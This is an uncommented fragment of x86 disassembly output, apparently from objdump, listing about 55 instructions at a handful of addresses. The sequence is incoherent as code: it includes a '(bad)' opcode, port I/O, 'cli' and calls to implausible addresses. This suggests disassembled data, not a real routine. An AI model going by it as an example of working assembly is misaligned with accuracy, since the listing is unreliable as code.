  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
